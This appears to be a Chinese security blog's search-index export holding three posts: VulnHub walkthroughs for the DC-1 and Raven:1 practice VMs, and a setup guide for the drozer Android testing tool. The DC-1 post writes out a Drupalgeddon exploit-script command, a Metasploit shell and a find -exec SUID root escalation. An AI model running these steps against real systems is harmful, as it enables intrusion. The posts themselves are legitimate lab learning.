<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>DC:1</title>
    <url>/2020/04/24/DC-1/</url>
    <content><![CDATA[<h2 id="DC-1"><a href="#DC-1" class="headerlink" title="DC-1"></a>DC-1</h2><p>从vulnhub上下载镜像安装好。</p>
<p>DC-1的IP：192.168.222.163</p>
<p>kali：192.168.222.135</p>
<a id="more"></a>

<h3 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h3><p>使用<code>sudo netdiscover -i eth0</code>命令探测存活主机,会耗上不少时间，扫描到就可以<code>Ctrl+C</code>结束了。</p>
<p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200423160813.png" alt="image-20200423160812105"></p>
<p>相对于上面的方法，使用arp探测速度快不少，<code>sudo arp-scan -l</code></p>
<p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200423160944.png" alt="image-20200423160942514"></p>
<p>后面发现这两种方法都有弊端，第一种太慢了，第二种貌似只能寻找192.168.222.1/24的机器，要想快速体验靶机建议使用NAT模式，然后第二种方法就可以了。</p>
<p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200423223433.png" alt="image-20200423223431070"></p>
<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo nmap -sS -A 192.168.222.163</span><br></pre></td></tr></table></figure>

<p>先收集端口和主机信息，结果如下</p>
<p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200423153353.png" alt="image-20200423153351951"></p>
<p>开启了22,80,111端口(rpc服务不了解)</p>
<p>22端口可用于爆破ssh密码，远程连接和利用OpenSSL的漏洞</p>
<p>880端口则提供web服务，通过web渗透</p>
<p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200423154454.png" alt="image-20200423154452893"></p>
<p>操作系统为linux，内核版本为3.x</p>
<p>访问80端口，Drupal引起了注意，不出意外是Drupal搭建的网站，尝试网上搜索香瓜</p>
<p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200423154704.png" alt="image-20200423154702800"></p>
<p>目录扫描</p>
<p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200423163200.png" alt="image-20200423163158876"></p>
<p>使用<code>Wappalyzer</code>插件发现版本是<code>Drupal 7</code></p>
<p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200423161526.png" alt="image-20200423161525610"></p>
<p>直接在kali中搜索该版本漏洞</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">searchsploit Drupal 7</span><br></pre></td></tr></table></figure>

<p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200423161751.png" alt="image-20200423161749924"></p>
<p>可以选择自己想用的exp脚本试试手，我这里选择<code>Drupal 7.0 &lt; 7.31 - &#39;Drupalgeddon&#39; SQL Injection (Add Admin User)  | exploits/php/webapps/34992.py</code></p>
<p>看介绍就是通过sql注入添加一个管理员账号，运行脚本查看用法如下</p>
<p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200423162723.png" alt="image-20200423162722062"></p>
<p>直接攻击</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python /usr/share/exploitdb/exploits/php/webapps/34992.py -t http://192.168.222.163/ -u hello -p world</span><br></pre></td></tr></table></figure>

<p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200423162748.png" alt="image-20200423162746417"></p>
<p>可以看到成功的添加了一个管理员账号，话不多说，直接登录进入</p>
<p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200423162918.png" alt="image-20200423162916894"></p>
<p>在查看配置是发现了更新警告，看来这是一个存在不少漏洞的版本，这个漏洞编号是<code>CVE-2014-3704</code>,查看exp脚本源码发现是一个POST型的sql注入，传递了一些注入参数，具体原理不是很明白。</p>
<p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200423163344.png" alt="image-20200423163343153"></p>
<p>在网上查到的简单利用方式</p>
<p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200423165902.png" alt="image-20200423165900623"></p>
<h3 id="使用msf"><a href="#使用msf" class="headerlink" title="使用msf"></a>使用msf</h3><p>查询msf利用模块</p>
<p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200423170126.png" alt="image-20200423170124315"></p>
<p>这里实在不好确定先从哪一个开始，推荐从最新的利用模块往前尝试，同时<code>show options</code>查看需要的信息是否都有.尝试发现2019年不行，2018年的成功。</p>
<p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200423170513.png" alt="image-20200423170507037"></p>
<p>只需要配置目标ip地址参数后直接run，成功反弹shell</p>
<p>![image-20200423170710899](D:/Program Files/Typora/upload/image-20200423170710899.png)</p>
<p>在目录下发现了<code>flag1</code></p>
<p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200423171558.png" alt="image-20200423171557442"></p>
<p>其实<code>flag3</code>在之前登陆管理员的配置里面就能看见</p>
<p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200423181405.png" alt="image-20200423181403635"></p>
<p>在<code>/etc/passwd</code>下面发现<code>flag4</code>的踪迹</p>
<p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200423182056.png" alt="image-20200423182054785"></p>
<p>查看flag4.txt，提示root中貌似还有一个flag</p>
<p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200423182152.png" alt="image-20200423182151523"></p>
<h3 id="进入shell"><a href="#进入shell" class="headerlink" title="进入shell"></a>进入shell</h3><p>这里遇到了一个问题，无法进入shell，问题如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[-] Error running command shell: ArgumentError wrong number of arguments (given 4, expected 5)</span><br></pre></td></tr></table></figure>

<p>msf版本是5.079-dev，网上查到是由于与ruby脚本更新不一致导致，修改</p>
<p><code>/usr/share/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/sys/process.rb</code></p>
<p>的第181行，加入一个<code>nil</code>凑成五个参数。</p>
<p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200423201446.png" alt="image-20200423201445021"></p>
<p>后面成功进入shell，不过看着很奇怪，，，没有cmd&gt;这样的提示符</p>
<p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200423201558.png" alt="image-20200423201556850"></p>
<p>不过凑合使用吧。进入shell后尝试<code>sudo提权</code></p>
<p>使用下面的命令可以查看系统上所有运行的SUID可执行文件，记住一个即可。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1. find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">2. find / -perm =u=s -type f 2&gt;/dev/null</span><br><span class="line">3. find / -user root -perm -4000 -exec ls -ldb &#123;&#125; \;</span><br></pre></td></tr></table></figure>

<p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200423202128.png" alt="image-20200423202127138"></p>
<p>这些二进制文件可以以root的身份运行，因为他们的权限中都有s，是SUID文件。</p>
<p>SUID是Linux的一种权限机制，具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者的权限。如果拥有SUID权限，那么就可以利用系统中的二进制文件和工具来进行root提权。</p>
<p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200423202357.png" alt="image-20200423202355806"></p>
<p>已知可以提权的linux命令有</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap</span><br><span class="line">vim</span><br><span class="line">find</span><br><span class="line">bash</span><br><span class="line">more</span><br><span class="line">less</span><br><span class="line">nano</span><br><span class="line">cp</span><br></pre></td></tr></table></figure>

<p>突然在一篇文章上看到这得到的并不是交互式的shell，可以使用python回弹一个交互式shell</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">"import pty;pty.spawn('/bin/bash')"</span></span><br></pre></td></tr></table></figure>

<p>之后果然看着舒服多了，haha</p>
<p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200423202956.png" alt="image-20200423202955520"></p>
<p>接下来使用find提权，主要是利用了find的<code>-exec {cmd} \;</code>选项可以将后面的参数当做命令执行，其实就是暂时以root权限执行命令了，例如</p>
<p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200423203907.png" alt="image-20200423203905772"></p>
<p>执行<code>find flag1.txt -exec &quot;/bin/sh&quot; \;</code>,这里之前进入了错误的/bin/bash,没有得到root权限，有点疑问为什么不一样。</p>
<p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200423204356.png" alt="image-20200423204354472"></p>
<p>先不管了，直接进入/root目录拿到最后一个flag</p>
<p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200423204626.png" alt="image-20200423204624491"></p>
<p>感觉好像有点不对，flag2还没找到!!! ，后面发现还有数据库没有查找，找网站配置文件的时候同时发现了flag2，在<code>/var/www/sites/default/settings.php</code>中</p>
<p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200423205503.png" alt="image-20200423205502263"></p>
<p>作者似乎很有趣。。。拿到账号密码后成功进入数据库</p>
<p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200423205650.png" alt="image-20200423205649603"></p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ol>
<li>系统化的思路还是挺重要的，flag出现的位置也是渗透中的关键点，比如数据库，网站目录，后台，/etc/passwd目录等。</li>
<li>进一步深入了解了sudo提权，但也觉得还不够深刻和熟悉</li>
<li>不断学习，不断积累，多看别人的文章，对比不同的人的想法和思路</li>
<li>条条大路通flag</li>
</ol>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><blockquote>
<p><a href="http://www.feidao.site/wordpress/index.php/2020/04/15/vulnhub-dc-1/" target="_blank" rel="noopener">http://www.feidao.site/wordpress/index.php/2020/04/15/vulnhub-dc-1/</a></p>
<p><a href="https://blog.csdn.net/qq_17592003/article/details/95985962" target="_blank" rel="noopener">https://blog.csdn.net/qq_17592003/article/details/95985962</a></p>
</blockquote>
]]></content>
      <categories>
        <category>后渗透</category>
      </categories>
      <tags>
        <tag>靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>droze入坑</title>
    <url>/2020/04/24/droze/</url>
    <content><![CDATA[<h1 id="droze入坑"><a href="#droze入坑" class="headerlink" title="droze入坑"></a>droze入坑</h1><h3 id="配置依赖"><a href="#配置依赖" class="headerlink" title="配置依赖"></a>配置依赖</h3><ul>
<li>python27安装</li>
<li>python27依赖库安装，建议安装前给pip换源，加入环境变量<ol>
<li>pip install protobuf</li>
<li>pip install pyOpenSSL</li>
<li>pip install service_identity</li>
<li>pip install Twisted </li>
</ol>
</li>
<li>adb安装—-<a href="http://adbshell.com/upload/adb.zip" target="_blank" rel="noopener">下载地址</a><a id="more"></a>

</li>
</ul>
<h3 id="adb配置"><a href="#adb配置" class="headerlink" title="adb配置"></a>adb配置</h3><p>下载好adb压缩包后压解在一个位置，并将该路径加入系统环境变量。压解后如下</p>
<p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200422181709.png" alt="image-20200422181707634"></p>
<p>通过USB线将手机与电脑连接，注意手机要开启USB调试，通常在开发者选项下。连接后使用下面命令查看连接的设备</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">adb devices</span><br></pre></td></tr></table></figure>

<p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200422182010.png" alt="image-20200422182009746"></p>
<p>然后就可以继续下一步了</p>
<h3 id="安装droze"><a href="#安装droze" class="headerlink" title="安装droze"></a>安装droze</h3><p><a href="https://github.com/mwrlabs/drozer/releases/" target="_blank" rel="noopener">下载地址</a> win10选择红框内的下载</p>
<p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200422181019.png" alt="image-20200422181018450"></p>
<p>下一步</p>
<p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200422181107.png" alt="image-20200422181106447"></p>
<p>下一步</p>
<p>点击下面那个磁盘（python from another location），在下面填入python27的路径</p>
<p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200422181129.png" alt="image-20200422181127729"></p>
<p>安装好后给手机下载agent</p>
<p><a href="https://github.com/mwrlabs/drozer/releases/download/2.3.4/drozer-agent-2.3.4.apk" target="_blank" rel="noopener">下载地址</a></p>
<p>安装好后，开启右下角的代理</p>
<p>通过adb端口转发</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">adb forward tcp:31415 tcp:31415</span><br></pre></td></tr></table></figure>

<h3 id="dorze连接"><a href="#dorze连接" class="headerlink" title="dorze连接"></a>dorze连接</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">drozer console connect</span><br></pre></td></tr></table></figure>

<p>正常连接如下（如果命令执行不成功，在python27的scripts目录下执行）</p>
<p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200422185125.png" alt="image-20200422185123863"></p>
<p><strong>乱码问题解决</strong></p>
<p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200422185404.png" alt="image-20200422185402644"></p>
<p>该命令是查看手机中安装的App包列表，但是中文乱码了，这是由于cmd的编码和java（python）不一致导致的</p>
<p>chcp查看cmd默认0编码为936（GBK）</p>
<p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200422185556.png" alt="image-20200422185555109"></p>
<p>通过<code>chcp 65001</code>设置编码为<code>utf-8</code></p>
<p>然后执行<code>set PYTHONIOENCODING=UTF-8</code>(此方法是临时的)</p>
<p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200422185736.png" alt="image-20200422185734474"></p>
<p>然后重新连接drozer，成功显示中文编码</p>
<p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200422190114.png" alt="image-20200422190112738"></p>
<h3 id="使用drozer对app进行测试"><a href="#使用drozer对app进行测试" class="headerlink" title="使用drozer对app进行测试"></a>使用drozer对app进行测试</h3><h4 id="drozer的相关参数"><a href="#drozer的相关参数" class="headerlink" title="drozer的相关参数"></a>drozer的相关参数</h4><table>
<thead>
<tr>
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody><tr>
<td>run</td>
<td>Executes a drozer module</td>
</tr>
<tr>
<td>list</td>
<td>Show a list of all drozer modules that can be executed in the current session. This hides modules that you do not have suitable permissions to run.</td>
</tr>
<tr>
<td>shell</td>
<td>Start an interactive Linux shell on the device, in the context of the Agent process.</td>
</tr>
<tr>
<td>cd</td>
<td>Mounts a particular namespace as the root of session, to avoid having to repeatedly type the full name of a module.</td>
</tr>
<tr>
<td>clean</td>
<td>Remove temporary files stored by drozer on the Android device.</td>
</tr>
<tr>
<td>echo</td>
<td>Print text to the console.</td>
</tr>
<tr>
<td>exit</td>
<td>Terminate the drozer session.</td>
</tr>
<tr>
<td>help</td>
<td>Display help about a particular command or module.</td>
</tr>
<tr>
<td>contributors</td>
<td>Displays a list of people who have contributed to the drozer framework and modules in use on your system</td>
</tr>
<tr>
<td>load</td>
<td>Load a file containing drozer commands, and execute them in sequence.</td>
</tr>
<tr>
<td>module</td>
<td>Find and install additional drozer modules from the Internet.</td>
</tr>
<tr>
<td>permissions</td>
<td>Display a list of the permissions granted to the drozer Agent.</td>
</tr>
<tr>
<td>set</td>
<td>Store a value in a variable that will be passed as an environment variable to any Linux shells spawned by drozer.</td>
</tr>
<tr>
<td>unset</td>
<td>Remove a named variable that drozer passes to any Linux shells that it spawns</td>
</tr>
</tbody></table>
<h4 id="drozer的四大组件"><a href="#drozer的四大组件" class="headerlink" title="drozer的四大组件"></a>drozer的四大组件</h4><table>
<thead>
<tr>
<th><strong>Activity</strong></th>
<th>app.activity.forintent – 找到可以处理已指定的包 <br />app.activity.info – 获取activity组件信息 <br />app.activity.start – 开启activity组件 <br />scanner.activity.browsable – 获取可从web浏览器调用的所有可浏览的activity组件</th>
</tr>
</thead>
<tbody><tr>
<td><strong>Service</strong></td>
<td><strong>app.provider.columns – 在内容提供程序中列出列<br/>app.provider.delete – 在内容提供程序中删除<br/>app.provider.download – 在内容提供程序中下载支持文件<br/>app.provider.finduri – 在包中查找引用的内容URIS<br/>app.provider.info – 获取Content Provider组件信息<br/>app.provider.insert – 插入到Content Provider组件中<br/>app.provider.query – 查询Content Provider组件<br/>app.provider.read – 从支持文件的Content Provider读取<br/>app.provider.update – 更新Content Provider的记录<br/>scanner.provider.finduris – 搜索可从上下文中查询的Content Provider<br/>scanner.provider.injection – 测试Content Provider的注入漏洞<br/>scanner.provider.sqltables – 查找可通过SQL注入漏洞访问的表<br/>scanner.provider.traversal – 测试Content Provider的基本目录遍历漏洞</strong></td>
</tr>
<tr>
<td><strong>Content Provider</strong></td>
<td><strong>app.service.info – 获取service组件信息<br/>app.service.send – 向服务组件发送消息并显示答复<br/>app.service.start – 开启service组件<br/>app.service.stop – 停止service组件</strong></td>
</tr>
<tr>
<td><strong>Broadcast Receivers</strong></td>
<td><strong>app.broadcast.info – 获取有关广播接收器的信息<br/>app.broadcast.send – 带目的发送广播<br/>app.broadcast.sniff – 注册一个能嗅出特定意图的广播接收器</strong></td>
</tr>
</tbody></table>
<h4 id="drozer的基本用法"><a href="#drozer的基本用法" class="headerlink" title="drozer的基本用法"></a><strong>drozer的基本用法</strong></h4><ol>
<li>使用list查看支持哪些模块</li>
<li>使用help module_name，或者run module_name -h查看各module的用法</li>
<li>通过run module_name module_options来对app进行检测</li>
</ol>
<h4 id="基本信息收集流程"><a href="#基本信息收集流程" class="headerlink" title="基本信息收集流程"></a><strong>基本信息收集流程</strong></h4><h5 id="通过app-package-list模块获取要检测的app的包名"><a href="#通过app-package-list模块获取要检测的app的包名" class="headerlink" title="通过app.package.list模块获取要检测的app的包名"></a>通过app.package.list模块获取要检测的app的包名</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">run app.package.list -f momo &#x2F;&#x2F;-f是搜索的意思</span><br></pre></td></tr></table></figure>

<p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200422193243.png" alt="image-20200422193241526"></p>
<h5 id="使用app-package-info模块查看apk基本信息"><a href="#使用app-package-info模块查看apk基本信息" class="headerlink" title="使用app.package.info模块查看apk基本信息"></a>使用app.package.info模块查看apk基本信息</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">run app.package.info -a com.maimemo.android.momo</span><br></pre></td></tr></table></figure>

<p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200422193447.png" alt="image-20200422193445839"></p>
<h5 id="使用app-package-attacksurface模块识别攻击面"><a href="#使用app-package-attacksurface模块识别攻击面" class="headerlink" title="使用app.package.attacksurface模块识别攻击面"></a>使用app.package.attacksurface模块识别攻击面</h5><h5 id="使用app-activity-info模块查看activity组件信息"><a href="#使用app-activity-info模块查看activity组件信息" class="headerlink" title="使用app.activity.info模块查看activity组件信息"></a>使用app.activity.info模块查看activity组件信息</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">run app.activity.info -a com.maimemo.android.momo</span><br></pre></td></tr></table></figure>

<p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200422193853.png" alt="image-20200422193852147"></p>
<h5 id="使用app-provider-info模块查看content-provider组件信息"><a href="#使用app-provider-info模块查看content-provider组件信息" class="headerlink" title="使用app.provider.info模块查看content provider组件信息"></a>使用app.provider.info模块查看content provider组件信息</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">run app.provider.info -a  com.maimemo.android.momo</span><br></pre></td></tr></table></figure>

<p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200422194032.png" alt="image-20200422194031256"></p>
<h5 id="使用app-service-info模块查看service组件信息"><a href="#使用app-service-info模块查看service组件信息" class="headerlink" title="使用app.service.info模块查看service组件信息"></a>使用app.service.info模块查看service组件信息</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">run app.service.info -a com.maimemo.android.momo</span><br></pre></td></tr></table></figure>

<p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200422194119.png" alt="image-20200422194118675"></p>
<p>具体攻击测试可以参考<a href="http://www.feidao.site/wordpress/index.php/2020/04/07/android11/" target="_blank" rel="noopener">这篇文章</a></p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><blockquote>
<p><a href="http://www.feidao.site/wordpress/index.php/2020/04/07/android11/" target="_blank" rel="noopener">http://www.feidao.site/wordpress/index.php/2020/04/07/android11/</a></p>
<p><a href="https://www.cnblogs.com/lsdb/p/9441813.html" target="_blank" rel="noopener">https://www.cnblogs.com/lsdb/p/9441813.html</a></p>
<p><a href="https://www.cnblogs.com/lsdb/p/9438215.html" target="_blank" rel="noopener">https://www.cnblogs.com/lsdb/p/9438215.html</a></p>
<p><a href="https://www.cnblogs.com/fanfeng/p/9246776.html" target="_blank" rel="noopener">https://www.cnblogs.com/fanfeng/p/9246776.html</a></p>
<p><a href="https://github.com/conda/conda/issues/5448" target="_blank" rel="noopener">https://github.com/conda/conda/issues/5448</a></p>
</blockquote>
]]></content>
      <categories>
        <category>安卓</category>
      </categories>
      <tags>
        <tag>安卓</tag>
      </tags>
  </entry>
  <entry>
    <title>Raven:1</title>
    <url>/2020/04/24/Raven1/</url>
    <content><![CDATA[<h2 id="Raven-1"><a href="#Raven-1" class="headerlink" title="Raven:1"></a>Raven:1</h2><p>这是vlunhub里的一个靶机，下载地址:<code>https://www.vulnhub.com/entry/raven-1,256/</code>.搭建在本地虚拟机上，作者没有告诉账号和密码。可能需要自己解决。</p>
<p>攻击机：kali 192.168.222.135</p>
<p>靶机：Raven1 192.168.222.161（由存活扫描可以探测）</p>
<a id="more"></a>

<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="存活探测"><a href="#存活探测" class="headerlink" title="存活探测"></a>存活探测</h4><p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200414201206.png" alt="image-20200414201205528"></p>
<h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200414201306.png" alt="image-20200414201304423"></p>
<p>可以看见开放了22,80,111端口。之前看见过不同端口利用的文章，回忆一下。</p>
<p>22端口</p>
<p>ssh远程连接服务，常见利用方式如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.ssh弱口令</span><br><span class="line">2.openssh漏洞</span><br></pre></td></tr></table></figure>

<p>80端口是基本的http服务就不说了，111端口的服务不了解。</p>
<h4 id="访问web界面"><a href="#访问web界面" class="headerlink" title="访问web界面"></a>访问web界面</h4><p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200414201645.png" alt="image-20200414201643702"></p>
<h4 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h4><p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200414201834.png" alt="image-20200414201833121"></p>
<p>得到了一些基本信息，没得到最想要得cms框架。对web界面进行了常规检测，貌似没有发现漏洞（可能是我太菜了）,但是在serverce.html页面源代码中得到了第一个flag1</p>
<p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200414202714.png" alt="image-20200414202711286"></p>
<p>刚玩得时候没有想到可以收集页面上的身份信息，看了其他大佬的文章才get到。</p>
<h4 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h4><p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200414210857.png" alt="image-20200414210856206"></p>
<p>网页格式乱码，有一些js文件加载失败，发现应该是加载的本地文件，尝试修改hosts文件,添加<code>192.168.222.161 raven.local</code></p>
<p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200414210645.png" alt="image-20200414210643686"></p>
<p>重新加载，这下就ok了，正常了，注意到这里有个名字，应该是作者的名字，对后面的爆破很有帮助。</p>
<p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200414211052.png" alt="image-20200414211050631"></p>
<h4 id="使用wpscan进行扫描"><a href="#使用wpscan进行扫描" class="headerlink" title="使用wpscan进行扫描"></a>使用wpscan进行扫描</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$wpscan</span> --update</span><br><span class="line"><span class="variable">$wpscan</span> --url http://192.168.222.161/wordpress/</span><br><span class="line"></span><br><span class="line">[+] URL: http://192.168.222.161/wordpress/ [192.168.222.161]</span><br><span class="line">[+] Started: Tue Apr 14 21:05:20 2020</span><br><span class="line"></span><br><span class="line">Interesting Finding(s):</span><br><span class="line"></span><br><span class="line">[+] Headers</span><br><span class="line"> | Interesting Entry: Server: Apache/2.4.10 (Debian)</span><br><span class="line"> | Found By: Headers (Passive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] XML-RPC seems to be enabled: http://192.168.222.161/wordpress/xmlrpc.php</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"> | References:</span><br><span class="line"> |  - http://codex.wordpress.org/XML-RPC_Pingback_API</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access</span><br><span class="line"></span><br><span class="line">[+] http://192.168.222.161/wordpress/readme.html</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] http://192.168.222.161/wordpress/wp-cron.php</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 60%</span><br><span class="line"> | References:</span><br><span class="line"> |  - https://www.iplocation.net/defend-wordpress-from-ddos</span><br><span class="line"> |  - https://github.com/wpscanteam/wpscan/issues/1299</span><br><span class="line"></span><br><span class="line">[+] WordPress version 4.8.12 identified (Latest, released on 2019-12-12).</span><br><span class="line"> | Found By: Emoji Settings (Passive Detection)</span><br><span class="line"> |  - http://192.168.222.161/wordpress/, Match: <span class="string">'-release.min.js?ver=4.8.12'</span></span><br><span class="line"> | Confirmed By: Meta Generator (Passive Detection)</span><br><span class="line"> |  - http://192.168.222.161/wordpress/, Match: <span class="string">'WordPress 4.8.12'</span></span><br><span class="line"></span><br><span class="line">[i] The main theme could not be detected.</span><br><span class="line"></span><br><span class="line">[+] Enumerating All Plugins (via Passive Methods)</span><br><span class="line"></span><br><span class="line">[i] No plugins Found.</span><br><span class="line"></span><br><span class="line">[+] Enumerating Config Backups (via Passive and Aggressive Methods)</span><br><span class="line"> Checking Config Backups - Time: 00:00:00 &lt;==================&gt; (21 / 21) 100.00% Time: 00:00:00</span><br><span class="line"></span><br><span class="line">[i] No Config Backups Found.</span><br><span class="line"></span><br><span class="line">[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.</span><br><span class="line">[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up</span><br><span class="line"></span><br><span class="line">[+] Finished: Tue Apr 14 21:05:37 2020</span><br><span class="line">[+] Requests Done: 44</span><br><span class="line">[+] Cached Requests: 4</span><br><span class="line">[+] Data Sent: 10.145 KB</span><br><span class="line">[+] Data Received: 117.603 KB</span><br><span class="line">[+] Memory used: 140.539 MB</span><br><span class="line">[+] Elapsed time: 00:00:17</span><br></pre></td></tr></table></figure>

<p>可以得到重要版本信息</p>
<p>WordPress version 4.8.12</p>
<h4 id="继续对该版本wprdpress进行漏洞扫描"><a href="#继续对该版本wprdpress进行漏洞扫描" class="headerlink" title="继续对该版本wprdpress进行漏洞扫描"></a>继续对该版本wprdpress进行漏洞扫描</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">searchsploit wordpress 4.8.12</span></span><br><span class="line">Exploits: No Result</span><br><span class="line">Shellcodes: No Result</span><br><span class="line"></span><br><span class="line">//scan themes vulnerability</span><br><span class="line"><span class="meta">$</span><span class="bash">wpscan --url http://192.168.222.161/wordpress/ --enumerate vt</span></span><br><span class="line"></span><br><span class="line">//scan pulgins vunlnerability</span><br><span class="line"><span class="meta">$</span><span class="bash">wpscan --url http://192.168.222.161/wordpress/ --enumerate vp</span></span><br></pre></td></tr></table></figure>

<p>因为是最新的，所以没有发现可利用漏洞。</p>
